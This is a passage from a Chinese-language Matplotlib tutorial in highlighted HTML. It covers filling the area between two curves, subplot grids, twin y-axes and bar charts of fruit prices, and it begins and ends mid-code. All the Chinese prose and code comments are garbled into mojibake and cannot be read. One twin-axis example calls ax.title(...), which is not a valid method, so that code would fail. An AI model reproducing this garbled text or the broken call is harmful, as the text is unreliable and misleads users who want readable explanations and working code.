<span class="hljs-keyword">def</span> <span class="hljs-title function_">quadratic_polynomial</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> (<span class="hljs-number">3</span> * x**<span class="hljs-number">2</span> + <span class="hljs-number">5</span> * x - <span class="hljs-number">2</span>) / <span class="hljs-number">1.5</span>
fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))

<span class="hljs-comment"># ç»˜åˆ¶è¿™ä¸¤ä¸ªå‡½æ•°</span>
x = generate_range(-<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0.05</span>)
y3 = apply_function_to_vector(x, cubic_polynomial)
y2 = apply_function_to_vector(x, quadratic_polynomial)
ax.plot(x, y3,label=<span class="hljs-string">"Cubic"</span>)
ax.plot(x, y2,label=<span class="hljs-string">"Quadratic"</span>)

<span class="hljs-comment"># å¡«å……xåœ¨[-2,0]ä¹‹é—´ï¼Œä»¥ä¸€å…ƒä¸‰æ¬¡å‡½æ•°ä¸ºä¸Šé™ï¼Œä¸€å…ƒäºŒæ¬¡å‡½æ•°ä¸ºä¸‹é™çš„åŒºé—´</span>
interval_x = generate_range(-<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.05</span>)
interval_y3 = apply_function_to_vector(interval_x, cubic_polynomial)
interval_y2 = apply_function_to_vector(interval_x, quadratic_polynomial)
ax.fill_between(
    interval_x,     <span class="hljs-comment"># x åŒºé—´</span>
    interval_y3,    <span class="hljs-comment"># ä¸Šè¾¹ç•Œï¼ˆä¸‰æ¬¡å‡½æ•°ï¼‰</span>
    interval_y2,    <span class="hljs-comment"># ä¸‹è¾¹ç•Œï¼ˆäºŒæ¬¡å‡½æ•°ï¼‰</span>
    color=<span class="hljs-string">"#2B6DA3"</span>, <span class="hljs-comment"># å¡«å……é¢œè‰²</span>
    alpha=<span class="hljs-number">0.25</span>,     <span class="hljs-comment"># é€æ˜åº¦</span>
    label=<span class="hljs-string">"Interval"</span> <span class="hljs-comment"># ç”¨äºå›¾ä¾‹çš„æ ‡ç­¾</span>
    <span class="hljs-comment"># hatch="//"    #è¿™ä¸ªå±æ€§çš„ä»‹ç»è¯¦è§æ¡å½¢å›¾ç« èŠ‚</span>
)

ax.legend()
</code></pre>
<p>è¿è¡Œä¸Šè¿°ä»£ç åï¼Œæˆ‘ä»¬å¾—åˆ°å¦‚å›¾ 10 æ‰€ç¤ºçš„ç»“æœï¼Œå…¶ä¸­è“è‰²åŒºåŸŸå³ä¸ºä¸¤ä¸ªå‡½æ•°åœ¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><mo>âˆ’</mo><mn>2</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">x \in [-2,0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">âˆ’</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0</span><span class="mclose">]</span></span></span></span></span> åŒºé—´å†…çš„åŒ…å›´åŒºåŸŸï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14c02edfb11d4d4e97b4baf13223cda1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=NWel0eUi2KbfgxsiD46mNhUiMS0%3D" alt="c8.jpg" width="70%" loading="lazy"/></p>
<p>å…¶å®åŒºé—´å¡«å……å¯ä»¥ç”»å‡ºå¾ˆå¤šæœ‰è¶£çš„å›¾ï¼Œå¦‚ä¸‹å›¾11æ‰€å±•ç¤ºçš„å››å¼ å›¾è¡¨ï¼Œä»…éœ€æŒæ¡ä¸Šæ–‡æ‰€æåˆ°çš„å†…å®¹å³å¯ç»˜åˆ¶å‡ºæ¥ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02b5f1fc590e4294be03830f65ddaf37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=Qpux481RC8waIBMxJaKr%2B%2FuHACE%3D" alt="c9.jpg" width="100%" loading="lazy"/></p>
<h4 data-id="heading-10">3.2 å¤šå­å›¾</h4>
<p>åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>fig, ax = plt.subplots(figsize=(6, 4))</code> åˆ›å»ºäº†ä¸€å¼ ç”»å¸ƒï¼Œå¹¶åœ¨å…¶ä¸Šç»˜åˆ¶äº†å•ä¸ªå›¾è¡¨ã€‚ç„¶è€Œåœ¨å®é™…åˆ†æä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦å°†å¤šä¸ªå›¾è¡¨å¹¶æ’å±•ç¤ºï¼Œä»¥ä¾¿ç›´è§‚åœ°æ¯”è¾ƒä¸åŒæ•°æ®æˆ–è§†è§’ã€‚è¿™æ—¶ï¼Œå¤šå­å›¾ï¼ˆSubplotsï¼‰åŠŸèƒ½å°±æ´¾ä¸Šäº†ç”¨åœºã€‚</p>
<p>é€šè¿‡ <code>plt.subplots()</code> å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾åˆ›å»ºåŒ…å«å¤šä¸ªåæ ‡è½´ï¼ˆAxesï¼‰çš„ç½‘æ ¼å¸ƒå±€ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç åˆ›å»ºäº†ä¸€ä¸ª 2 è¡Œ 4 åˆ—ï¼Œæ€»å…± <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>Ã—</mo><mn>4</mn><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">2 \times 4 = 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">8</span></span></span></span></span> ä¸ªå­å›¾çš„ç”»å¸ƒï¼š</p>
<pre><code class="hljs language-python" lang="python">row = <span class="hljs-number">2</span>  <span class="hljs-comment"># è®¾å®šå­å›¾è¡Œæ•°ä¸º 2</span>
col = <span class="hljs-number">4</span>  <span class="hljs-comment"># è®¾å®šå­å›¾åˆ—æ•°ä¸º 4</span>
fig, axs = plt.subplots(row, col, figsize=(<span class="hljs-number">15</span>, <span class="hljs-number">6</span>))
</code></pre>
<p>å°†å…¶ç»˜åˆ¶å‡ºæ¥ï¼Œå¦‚å›¾12æ‰€ç¤º</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87d56f65a814bed9436eb2b09330720~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=MDtFDhDID8yhL9eEOlFRxhVoppk%3D" alt="c10.jpg" width="100%" loading="lazy"/></p>
<p>è¿™é‡Œè¿”å›çš„ <code>axs</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ˆè¿™ä¹Ÿæ˜¯å˜é‡åå¸¦ â€œsâ€ çš„åŸå› ï¼‰ï¼Œå…¶å½¢çŠ¶ä¸º <code>(row, col)</code>ï¼Œå³ <code>(2, 4)</code>ã€‚ä½ å¯ä»¥é€šè¿‡äºŒç»´ç´¢å¼•æ¥è®¿é—®æ¯ä¸€ä¸ªå­å›¾åæ ‡è½´å¯¹è±¡ï¼š</p>
<ul>
<li><code>axs[0, 0]</code> å¯¹åº”ç¬¬ 1 è¡Œç¬¬ 1 åˆ—çš„å­å›¾</li>
<li><code>axs[0, 1]</code> å¯¹åº”ç¬¬ 1 è¡Œç¬¬ 2 åˆ—çš„å­å›¾</li>
<li>â€¦â€¦</li>
<li><code>axs[1, 3]</code> å¯¹åº”ç¬¬ 2 è¡Œç¬¬ 4 åˆ—çš„å­å›¾</li>
</ul>
<p><strong>é‚£ä¹ˆï¼Œå¦‚æœæˆ‘æƒ³åœ¨ç¬¬ 2 è¡Œç¬¬ 2 åˆ—çš„å­å›¾ä¸­ç»˜åˆ¶ä¸€ä¸ªä¸‰æ¬¡å‡½æ•°ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</strong> æ–¹æ³•ä¸åœ¨å•å›¾ä¸­ç»˜å›¾å®Œå…¨ä¸€è‡´ï¼Œåªéœ€é€‰ä¸­å¯¹åº”çš„åæ ‡è½´å¯¹è±¡å¹¶è¿›è¡Œæ“ä½œå³å¯ã€‚</p>
<pre><code class="hljs language-python" lang="python">fig, axs = plt.subplots(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,figsize=(<span class="hljs-number">15</span>, <span class="hljs-number">6</span>))
x = generate_range(-<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0.05</span>)
y = apply_function_to_vector(x, cubic_polynomial)

<span class="hljs-comment"># åœ¨ç¬¬äºŒè¡Œç¬¬äºŒåˆ—ï¼ˆç´¢å¼•ä¸º [1, 1]ï¼‰çš„å­å›¾ä¸­ç»˜å›¾</span>
axs[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>].plot(x,y)
axs[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>].set_title(<span class="hljs-string">"ä¸€å…ƒä¸‰æ¬¡å‡½æ•°"</span>)
axs[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>].grid(<span class="hljs-literal">True</span>, which=<span class="hljs-string">'both'</span>, linestyle=<span class="hljs-string">'--'</span>, linewidth=<span class="hljs-number">0.5</span>)
axs[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>].set_xlabel(<span class="hljs-string">"è¿™æ˜¯xè½´æ ‡ç­¾"</span>)
axs[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>].set_ylabel(<span class="hljs-string">"è¿™æ˜¯yè½´æ ‡ç­¾"</span>)

<span class="hljs-comment"># å¯é€‰ï¼šè°ƒæ•´å­å›¾ä¹‹é—´çš„é—´è·ï¼Œé¿å…æ ‡ç­¾é‡å </span>
fig.tight_layout()
</code></pre>
<p>è¿è¡Œç»“æœå¦‚å›¾13æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°åªåœ¨æŒ‡å®šçš„å­å›¾ä½ç½®ç»˜åˆ¶äº†å‡½æ•°æ›²çº¿ï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/354e7cf191514ae3ba4104b88ce5f6dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=aVKJ6Wuqq69N9vNoAhO59S5RsE4%3D" alt="c11.jpg" width="100%" loading="lazy"/></p>
<p>å½“ç„¶ï¼Œå¤šå­å›¾è¿˜æœ‰æ›´å¤šé«˜çº§å¸ƒå±€æ–¹å¼ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>å…±äº«åæ ‡è½´</strong>ï¼šå¤šä¸ªå­å›¾å…±äº«åŒä¸€ x è½´æˆ– y è½´ï¼Œä¾¿äºæ¯”è¾ƒã€‚</li>
<li><strong>ä¸å‡åŒ€å¸ƒå±€</strong>ï¼šä½¿ç”¨ <code>GridSpec</code> å®ç°æ›´çµæ´»ã€å¤§å°ä¸ä¸€çš„å­å›¾æ’åˆ—ã€‚</li>
<li><strong>åµŒå¥—å¸ƒå±€</strong>ï¼šåœ¨å¤§å›¾ä¸­åµŒå…¥å°å›¾ã€‚</li>
</ul>
<p>ç”±äºè¿™äº›æŠ€å·§åœ¨å…¥é—¨é˜¶æ®µä½¿ç”¨é¢‘ç‡ç›¸å¯¹è¾ƒä½ï¼Œæœ¬ç¯‡æ–‡ç« æš‚ä¸å±•å¼€ã€‚å¦‚æœä½ æœªæ¥é‡åˆ°ç›¸å…³éœ€æ±‚ï¼Œå¯ä»¥éšæ—¶æŸ¥é˜… <a href="https://link.juejin.cn?target=https%3A%2F%2Fmatplotlib.org%2F" target="_blank" title="https://matplotlib.org/" ref="nofollow noopener noreferrer">Matplotlib å®˜æ–¹æ–‡æ¡£</a>æˆ–è¯¢é—®ä½ èº«è¾¹çš„ AI åŠ©æ‰‹ã€‚</p>
<h4 data-id="heading-11">3.3 åŒè½´å›¾</h4>
<p><strong>ä»€ä¹ˆæ˜¯åŒè½´å›¾ï¼Ÿ</strong>
ç®€å•æ¥è¯´ï¼ŒåŒè½´å›¾å°±æ˜¯<strong>åœ¨åŒä¸€å¼ å›¾ä¸­ä½¿ç”¨ä¸¤ä¸ªç‹¬ç«‹çš„Yè½´ï¼ˆé€šå¸¸å…±äº«åŒä¸€ä¸ªXè½´ï¼‰</strong>ï¼Œç”¨æ¥åŒæ—¶å±•ç¤ºä¸¤ç§ä¸åŒé‡çº²æˆ–æ•°é‡çº§çš„æ•°æ®ã€‚è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åŒä¸€ä¸ªåæ ‡ç³»ä¸‹æ¸…æ™°å¯¹æ¯”ä¸¤ç»„å·®å¼‚å¾ˆå¤§çš„æ•°æ®ï¼Œè€Œä¸ä¼šè¢«å•ä¸€åæ ‡è½´çš„å°ºåº¦æ‰€é™åˆ¶ã€‚</p>
<p>æ¥çœ‹ä¸‹é¢çš„ä¾‹å­ï¼ˆå›¾14å·¦å›¾ï¼‰ï¼š</p>
<ul>
<li>å·¦ä¾§çš„çº¢è‰²Yè½´èŒƒå›´æ˜¯ -1 åˆ° 1ï¼Œå¯¹åº”æ­£å¼¦å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mtext>sin</mtext><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=\text{sin}(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">sin</span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span></li>
<li>å³ä¾§çš„è“è‰²Yè½´èŒƒå›´æ˜¯ 0 åˆ° 200ï¼Œå¯¹åº”ç¼©æ”¾åçš„æŒ‡æ•°å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mn>0.01</mn><mo>â‹…</mo><msup><mi>e</mi><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">y=0.01 \cdot e^{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.01</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6644em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span></span></span></span></span></li>
</ul>
<p>å¦‚æœä¸ç”¨åŒè½´ï¼Œè€Œæ˜¯æŠŠä¸¤æ¡æ›²çº¿ç”»åœ¨åŒä¸€ä¸ªYè½´ä¸‹ï¼ˆå›¾14å³å›¾ï¼‰ï¼Œç”±äºæŒ‡æ•°å‡½æ•°çš„æ•°å€¼è¿œå¤§äºæ­£å¼¦å‡½æ•°ï¼Œæ­£å¼¦æ›²çº¿çš„æ³¢åŠ¨å°±ä¼šè¢«ä¸¥é‡å‹ç¼©ï¼Œå‡ ä¹çœ‹ä¸å‡ºå…¶å½¢æ€ç»†èŠ‚ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/143d31fab10c4926bccda90607a59ab3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=nZq6kQCR8KgYLG7vWV%2Btkx2iZ2A%3D" alt="c12.jpg" width="100%" loading="lazy"/></p>
<p>Matplotlib ç»˜åˆ¶åŒè½´å›¾éå¸¸ç®€å•ï¼Œæ ¸å¿ƒæ–¹æ³•æ˜¯ä½¿ç”¨ <code>ax.twinx()</code> åˆ›å»ºå…±äº«Xè½´çš„ç¬¬äºŒä¸ªåæ ‡è½´ã€‚ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä»£ç ä¸€æ­¥æ­¥å®ç°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">import</span> math
plt.rcParams[<span class="hljs-string">"font.sans-serif"</span>] = [<span class="hljs-string">"SimHei"</span>]  <span class="hljs-comment"># ä½¿ç”¨SimHeiå­—ä½“ï¼ˆé»‘ä½“ï¼‰</span>
plt.rcParams[<span class="hljs-string">"axes.unicode_minus"</span>] = <span class="hljs-literal">False</span>

<span class="hljs-comment"># å®šä¹‰ä¸¤ä¸ªå‡½æ•°ï¼šæ­£å¼¦å‡½æ•°å’Œç¼©æ”¾åçš„æŒ‡æ•°å‡½æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sin</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> math.sin(x)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> math.exp(x) * <span class="hljs-number">0.01</span>

x = generate_range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0.05</span>)
y1 = apply_function_to_vector(x,sin)
y2 = apply_function_to_vector(x,exp)

fig, ax = plt.subplots(figsize=(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>))

<span class="hljs-comment"># æ­£å¸¸ç»˜åˆ¶ï¼Œåœ¨ä¸»åæ ‡è½´ä¸Šç»˜åˆ¶ç¬¬ä¸€æ¡æ›²çº¿ï¼ˆæ­£å¼¦ï¼Œçº¢è‰²ï¼‰</span>
ax.plot(x, y1, color=<span class="hljs-string">'red'</span>)
ax.set_xlabel(<span class="hljs-string">"Xè½´"</span>)  
ax.set_ylabel(<span class="hljs-string">"ä¸»yè½´: æ­£å¼¦å‡½æ•°"</span>, color=<span class="hljs-string">"red"</span>)

<span class="hljs-comment"># å°†ä¸»Yè½´çš„åˆ»åº¦æ ‡ç­¾ä¹Ÿè®¾ä¸ºçº¢è‰²ï¼Œå½¢æˆè§†è§‰ç»Ÿä¸€</span>
ax.tick_params(axis=<span class="hljs-string">"y"</span>,labelcolor=<span class="hljs-string">"red"</span>)

<span class="hljs-comment"># â˜… å…³é”®æ­¥éª¤ï¼šåˆ›å»ºå…±äº«Xè½´çš„æ¬¡åæ ‡è½´</span>
sub_ax = ax.twinx()

<span class="hljs-comment"># åœ¨æ¬¡åæ ‡è½´ä¸Šç»˜åˆ¶ç¬¬äºŒæ¡æ›²çº¿ï¼ˆæŒ‡æ•°ï¼Œè“è‰²ï¼‰</span>
<span class="hljs-comment"># sub_ax å’Œæ™®é€šçš„axä½¿ç”¨æ–¹æ³•ä¸€æ ·</span>
sub_ax.plot(x, y2, color=<span class="hljs-string">'blue'</span>)
sub_ax.set_ylabel(<span class="hljs-string">"æ¬¡Yè½´: æŒ‡æ•°å‡½æ•°"</span>, color=<span class="hljs-string">"blue"</span>)
sub_ax.tick_params(axis=<span class="hljs-string">"y"</span>, labelcolor=<span class="hljs-string">"blue"</span>)

ax.title(<span class="hljs-string">"åŒYè½´ç¤ºä¾‹: æ­£å¼¦å‡½æ•° vs æŒ‡æ•°å‡½æ•°"</span>)
plt.show()
</code></pre>
<ul>
<li><code>ax.twinx()</code> ä¼šåˆ›å»ºä¸€ä¸ªä¸ <code>ax</code> å…±äº« X è½´çš„æ–°åæ ‡è½´å¯¹è±¡ <code>sub_ax</code>ï¼Œå…¶ Y è½´é»˜è®¤æ”¾ç½®åœ¨å³ä¾§ã€‚</li>
<li><code>sub_ax</code> çš„ä½¿ç”¨æ–¹æ³•ä¸æ™®é€šåæ ‡è½´å®Œå…¨ç›¸åŒï¼Œå¯ä»¥è°ƒç”¨ <code>plot</code>ã€<code>set_ylabel</code>ã€<code>tick_params</code> ç­‰æ–¹æ³•ã€‚</li>
</ul>
<h3 data-id="heading-12">å››. æ¡å½¢å›¾</h3>
<p>æ¡å½¢å›¾ï¼ˆBar Chartï¼‰æ˜¯ä¸€ç§ä»¥çŸ©å½¢æ¡çš„é•¿åº¦æˆ–é«˜åº¦è¡¨ç¤ºæ•°å€¼å¤§å°çš„ç»Ÿè®¡å›¾è¡¨ï¼Œé€šå¸¸ç”¨äºå±•ç¤ºåˆ†ç±»æ•°æ®çš„å¯¹æ¯”ã€‚ä¸æŠ˜çº¿å›¾å¼ºè°ƒè¶‹åŠ¿ä¸åŒï¼Œæ¡å½¢å›¾æ›´ä¾§é‡äºç±»åˆ«ä¹‹é—´çš„æ¯”è¾ƒï¼Œå¸¸è§äºé”€å”®é¢å¯¹æ¯”ã€æŠ•ç¥¨ç»“æœã€ä»·æ ¼æ¯”è¾ƒç­‰åœºæ™¯ã€‚</p>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªå…¸å‹çš„å¤šç±»åˆ«æ¡å½¢å›¾ç¤ºä¾‹ï¼ˆå›¾15ï¼‰ï¼Œå®ƒæ¸…æ™°åœ°å±•ç¤ºäº†ä¸åŒæ•°æ®ç³»åˆ—åœ¨å¤šä¸ªç±»åˆ«ä¸Šçš„åˆ†å¸ƒä¸å¯¹æ¯”ï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a00442a63dd457fbb01b56014612205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=FxoMQDBP6V6LqQShuhWN46rCrbQ%3D" alt="c13.jpg" width="100%" loading="lazy"/></p>
<p>ç”¨ Matplotlib ç»˜åˆ¶æ¡å½¢å›¾éå¸¸ç®€å•ï¼Œä¸»è¦ä½¿ç”¨ <code>ax.bar()</code> æ–¹æ³•ã€‚æˆ‘ä»¬ä»¥ç»˜åˆ¶ä¸€ç»„æ°´æœæ‰¹å‘ä»·çš„æ¡å½¢å›¾ä¸ºä¾‹ï¼ˆè¿è¡Œç»“æœå¦‚å›¾16æ‰€ç¤ºï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ›å»ºç”»å¸ƒ</span>
fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4.5</span>))
<span class="hljs-comment"># è®¾ç½®æ¬¡åˆ»åº¦ï¼šæ¯ä¸¤ä¸ªä¸»åˆ»åº¦ä¹‹é—´åŒ…å«5ä¸ªæ¬¡åˆ»åº¦ï¼ˆä½¿åæ ‡è½´æ›´ç²¾ç»†ï¼‰</span>
ax.xaxis.set_minor_locator(AutoMinorLocator(<span class="hljs-number">5</span>))

<span class="hljs-comment"># æ•°æ®å‡†å¤‡</span>
wholesale_price = [<span class="hljs-number">5.1</span>, <span class="hljs-number">4.7</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">3.2</span>, <span class="hljs-number">4.3</span>]  <span class="hljs-comment"># æ‰¹å‘ä»·ï¼ˆå…ƒ/å…¬æ–¤ï¼‰</span>
x = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  <span class="hljs-comment"># æ¨ªåæ ‡ä½ç½®</span>

<span class="hljs-comment"># ç»˜åˆ¶æ¡å½¢å›¾ï¼ˆæ³¨æ„ï¼šä¸æ˜¯plotï¼Œè€Œæ˜¯barï¼‰</span>
ax.bar(
    x,                    <span class="hljs-comment"># æ¯ä¸ªæŸ±å­çš„æ¨ªåæ ‡ä½ç½®</span>
    wholesale_price,      <span class="hljs-comment"># æ¯ä¸ªæŸ±å­çš„é«˜åº¦ï¼ˆyå€¼ï¼‰</span>
    width=<span class="hljs-number">0.4</span>,            <span class="hljs-comment"># æŸ±å­çš„å®½åº¦</span>
    label=<span class="hljs-string">"æ‰¹å‘ä»·"</span>,        <span class="hljs-comment"># å›¾ä¾‹æ ‡ç­¾</span>
    color=<span class="hljs-string">"#35881B"</span>,      <span class="hljs-comment"># å¡«å……é¢œè‰²ï¼ˆç»¿è‰²ç³»ï¼‰</span>
    edgecolor=<span class="hljs-string">"black"</span>,    <span class="hljs-comment"># è¾¹æ¡†é¢œè‰²</span>
    alpha=<span class="hljs-number">0.8</span>,            <span class="hljs-comment"># ä¸é€æ˜åº¦ï¼ˆ0~1ï¼Œ1ä¸ºå®Œå…¨ä¸é€æ˜ï¼‰</span>
)
</code></pre>
<p>ä¸Šé¢çš„åŸºç¡€æ¡å½¢å›¾ç•¥æ˜¾å•è°ƒï¼Œæˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ­¥éª¤å¢å¼ºå¯è¯»æ€§ä¸ç¾è§‚åº¦ï¼ˆè¿è¡Œç»“æœå¦‚å›¾17æ‰€ç¤ºï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4.5</span>))

<span class="hljs-comment"># å…·ä½“åŒ–çš„æ°´æœä»·æ ¼å±æ€§</span>
wholesale_price = [<span class="hljs-number">5.1</span>, <span class="hljs-number">4.7</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">3.2</span>, <span class="hljs-number">4.3</span>]  <span class="hljs-comment"># æ‰¹å‘ä»·</span>

<span class="hljs-comment"># è®¾ç½®æ°´æœæ ‡ç­¾</span>
x = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
categories = [<span class="hljs-string">"é¦™è•‰"</span>, <span class="hljs-string">"æ©™å­"</span>, <span class="hljs-string">"è‹¹æœ"</span>, <span class="hljs-string">"æ©˜å­"</span>, <span class="hljs-string">"æå­"</span>]

<span class="hljs-comment"># è®¾ç½®xè½´åˆ»åº¦æ ‡ç­¾ï¼ˆç”¨çœŸå®æ°´æœåæ›¿æ¢æ•°å­—ï¼‰</span>
ax.set_xticks(x)
ax.set_xticklabels(categories)

<span class="hljs-comment"># ç»˜åˆ¶æ¡å½¢å›¾ï¼ˆæ¢ä¸ºæ›´ä¸­æ€§çš„æ·±ç°è‰²ï¼‰</span>
ax.bar(
    x, wholesale_price,
    width=<span class="hljs-number">0.4</span>,
    label=<span class="hljs-string">"æ‰¹å‘ä»·"</span>,
    color=<span class="hljs-string">"#272727"</span>,      <span class="hljs-comment"># æ·±ç°è‰²</span>
    edgecolor=<span class="hljs-string">"black"</span>,
    alpha=<span class="hljs-number">0.8</span>,
)

<span class="hljs-comment"># åœ¨æ¯ä¸ªæŸ±å­é¡¶éƒ¨æ·»åŠ æ•°å€¼æ ‡ç­¾ - ä½¿ç”¨xå’Œwholesale_priceå®šä½</span>
<span class="hljs-comment"># æœ¬è´¨ä½¿ç”¨ax.textåœ¨æŒ‡å®šä½ç½®æ·»åŠ æ–‡æœ¬</span>
<span class="hljs-keyword">for</span> xi, price <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x, wholesale_price):
